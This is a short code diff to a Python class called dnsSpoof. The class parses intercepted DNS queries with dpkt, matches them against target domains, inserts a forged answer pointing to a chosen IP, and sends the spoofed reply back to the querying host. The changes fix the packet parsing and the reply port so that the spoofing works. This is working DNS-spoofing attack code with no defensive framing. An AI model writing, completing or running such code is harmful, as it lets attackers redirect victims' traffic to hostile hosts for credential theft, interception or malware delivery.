@@ -23,7 +23,7 @@ class dnsSpoof:
             pass
 
     def analyze(self,packet):
-        dns = dpkt.dns.DNS(packet)
+        dns = dpkt.dns.DNS(packet.data.data)
         for domain in self.domains:
             if domain.dns == dns.qd[0].name:
                 if dns.qr != dpkt.dns.DNS_Q:
@@ -52,7 +52,8 @@ class dnsSpoof:
                 arr.ip = socket.inet_aton(domain.ip)
 
                 dns.an.append(arr)
+                port = packet.data.sport
 
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.sendto(str(data), (socket.inet_ntoa(ip.src), udp.sport))
+                sock.sendto(str(dns), (socket.inet_ntoa(packet.src), port))
 
